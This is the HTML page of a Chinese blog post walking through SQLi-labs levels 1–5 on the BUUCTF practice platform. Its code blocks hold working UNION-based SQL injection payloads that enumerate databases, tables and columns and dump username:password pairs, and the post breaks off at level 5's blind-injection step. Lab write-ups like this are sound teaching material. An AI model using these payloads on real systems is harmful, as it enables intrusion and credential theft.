@@ -1,0 +1,384 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>SQL-labs靶场通关 | X1NRI&#39;s trash</title>
+  <meta name="author" content="X1NRI">
+  
+  <meta name="description" content="靶场地址：BUUCTF在线评测
+
+level 1GET传参 ?id&amp;#x3D;1
+传参2回显不同，说明传入的参数是会进入数据库语句的
+1&amp;#39; 单引号报错，这里有报错注入
+1&amp;#39;--+
+可以判断出是字符型且存在SQL注入
+联合查询爆出列数，3列能正常回显
+1&#39;UNION SELECT 1,2,3--+"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="SQL-labs靶场通关"/>
+  <meta property="og:site_name" content="X1NRI&#39;s trash"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="X1NRI&#39;s trash" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">X1NRI&#39;s trash</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/links" title="Subscribe me.">
+			  <i class="fa fa-chain"></i>Links
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> SQL-labs靶场通关</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <blockquote>
+<p>靶场地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#sqli-labs">BUUCTF在线评测</a></p>
+</blockquote>
+<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>GET传参 ?id&#x3D;1<br><img src="/SNIPER_FILE/bf52f20479948ae3c94db8829592eb73_MD5.jpeg"></p>
+<p>传参2回显不同，说明传入的参数是会进入数据库语句的</p>
+<p><code>1&#39;</code> 单引号报错，这里有报错注入<br><img src="/SNIPER_FILE/0af604d9a444e02be20bb5d7b50ff5f8_MD5.jpeg"></p>
+<p><code>1&#39;--+</code><br><img src="/SNIPER_FILE/ad4c34712b16f5da90aff0ecddc85a14_MD5.jpeg"></p>
+<p>可以判断出是字符型且存在SQL注入</p>
+<p>联合查询爆出列数，3列能正常回显</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">1'UNION SELECT 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/SNIPER_FILE/1eb747fd3e620bdbb4ebbf430520d4cf_MD5.jpeg"></p>
+<p>确定回显位<br><img src="/SNIPER_FILE/7b05974a10e1da5c1879c7ed8bbbd552_MD5.jpeg"></p>
+<p>爆库，库名为 security </p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>爆表，库中有表 emails, referers, uagents, users</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>爆users表的字段</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/SNIPER_FILE/ba80e76bac98f19e3e11052afe732797_MD5.jpeg"></p>
+<p>爆 username 和 password 列的数据</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">-1'UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br>') from users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/SNIPER_FILE/6ef05546d1710f6aea02326ac0b8ddd5_MD5.jpeg"></p>
+<h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>还是GET传参，id?&#x3D;1</p>
+<p><code>1&#39;</code>单引号报错<br><img src="/SNIPER_FILE/629cd3175a7a2ec059bf1ff3b1fdb4ec_MD5.jpeg"></p>
+<p><code>1&#39;--+</code>还是报错，看来是字符型<br><img src="/SNIPER_FILE/7abe3f752d68c1e9e4ac58549624bae9_MD5.jpeg"></p>
+<p>然后跟level1一样了，把单引号去了就行<br><img src="/SNIPER_FILE/bb3bb333377d3af4f7dfec592006b912_MD5.jpeg"></p>
+<h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p>单引号报错，注释后面的也报错，是字符型，但是这里的报错要注意</p>
+<p><img src="/SNIPER_FILE/e5d773c3740dbff66a88890c15ec3dfe_MD5.jpeg"></p>
+<p>所以我们需要将括号闭合</p>
+<p>爆列数：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">id=-1') union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/SNIPER_FILE/44635ec4a33ed787d8cfb0ae2adb3657_MD5.jpeg"></p>
+<p>然后就是跟前面一样<br><img src="/SNIPER_FILE/114819b199c72e6933feb74b5553bc17_MD5.jpeg"></p>
+<h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>单引号没反应，双引号报错了，双引号的字符型<br><img src="/SNIPER_FILE/964a833c2c6d791c5ea5cba77438acdd_MD5.jpeg"></p>
+<p>注意括号闭合，跟level3一样<br><img src="/SNIPER_FILE/7ab66e7d9a58913596eb76f7d2ed6b15_MD5.jpeg"></p>
+<p>爆库</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">-1") union select 1,2,database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>爆字段</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">-1") UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br>') from users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+<h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>id&#x3D;1，回显了一个 “You are in”<br><img src="/SNIPER_FILE/2056d2fe10bbf187f0108da429847a99_MD5.jpeg"></p>
+<p>单引号报错<br><img src="/SNIPER_FILE/54ae93969a70a1a642189e336a6dda0d_MD5.jpeg"></p>
+<p>是字符型<br><img src="/SNIPER_FILE/e680cadad695f0424ad2531e6153ce7d_MD5.jpeg"></p>
+<p>爆列数：</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">id=1' union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/SNIPER_FILE/7df21af07b6ff5f2b32d87c9deab9bda_MD5.jpeg"></p>
+<p>但是没有回显点，bool盲注</p>
+<p>爆库：</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2024/12/22/SQL-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" class="leancloud-visitors view" data-flag-title="SQL-labs靶场通关">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/12/21/2024-12第三周2：normalbabynote/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-12-22 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/pentest/">pentest<span>9</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/web学习/">web学习<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-1"><span class="toc-article-text">level 1</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-2"><span class="toc-article-text">level 2</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-3"><span class="toc-article-text">level 3</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-4"><span class="toc-article-text">level 4</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#level-5"><span class="toc-article-text">level 5</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 X1NRI's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
